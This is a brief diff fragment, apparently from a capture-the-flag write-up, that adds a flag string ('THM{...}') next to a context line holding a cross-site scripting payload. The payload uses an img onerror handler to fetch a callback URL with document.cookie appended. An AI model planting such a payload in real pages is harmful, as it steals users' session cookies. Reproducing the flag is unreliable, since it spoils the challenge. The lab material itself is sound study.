@@ -358,7 +358,7 @@ note URGENT:ru7opium <img src=x onerror="fetch('/api/callback?d'+document.cookie
 ```
 
 ```
- 
+ THM{med1c4l_xss_ag3nt_w0rm}
 ```
 
 
